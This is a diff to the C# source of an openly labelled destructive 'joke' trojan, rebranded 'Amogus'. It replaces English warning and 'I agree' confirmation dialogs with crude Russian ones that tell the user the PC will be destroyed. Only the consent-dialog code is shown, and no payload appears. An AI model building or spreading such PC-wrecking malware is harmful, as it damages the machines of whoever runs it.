@@ -14,41 +14,21 @@ namespace UntitledTrojan.Tools
         {
             string inputText = "";
 
-            if (Entry.debug)
-                MessageBox.Show("WARNING! This is a harmless version." +
-                    "\nBut still it can crash your PC due to heavily using CPU." +
-                    "\nNext window will be a confirmation." +
-                    "\n\nCreated by TheAirBlow in 2020 (https://github.com/theairblow)", "UntitledTrojan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-            else
-                MessageBox.Show("WARNING! This is not a joke." +
-                    "\nThis will fuck your PC. Use VM for testing this malware." +
-                    "\nUse only for educational purposes." +
-                    "\nNext window will be a confirmation." +
-                    "\n\nCreated by TheAirBlow in 2020 (https://github.com/theairblow)", "UntitledTrojan", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            MessageBox.Show("Это не шутка." +
+                    "\nЕсли ты продолжишь, то твой комп будет уничтожен AMOGUS." +
+                    "\nТОЛЬКО ДЛЯ ИСПОЛЬЗОВАНИЯ В ИССЛЕДОВАТЕЛЬСКИХ ЦЕЛЯХ." +
+                    "\nДальше будет подтверждение ваших дествий." +
+                    "\n\nСделано TheAirBlow в 2021 (https://vk.com/theairblow)", "Amogus", MessageBoxButtons.OK, MessageBoxIcon.Warning);
 
-            DialogResult result = InputBox("UntitledTrojan", "Enter \"I agree\" if you are agree with anything showed before.", ref inputText);
+            DialogResult result = InputBox("Amogus", "Напиши \"Согласен\" если ты хочешь получить хуй взамен на твой ПК.", ref inputText);
             if (result == DialogResult.OK)
             {
-                if (inputText == "I agree")
-                {
-                    return true;
-                }
-                else
-                {
-                    MessageBox.Show("Trojan actions was cancelled.", "UntitledTrojan", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                    return false;
-                }
+                if (inputText == "Согласен") return true;
+                else MessageBox.Show("АХТУНГ! Отмена.", "Amogus", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
-            else
-            {
-                MessageBox.Show("Trojan actions was cancelled.", "UntitledTrojan", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                return false;
-            }
-        }
+            else MessageBox.Show("АХТУНГ! Отмена.", "Amogus", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-        internal static void AlreadyRan()
-        {
-
+            return false;
         }
 
         internal static DialogResult InputBox(string title, string promptText, ref string value)
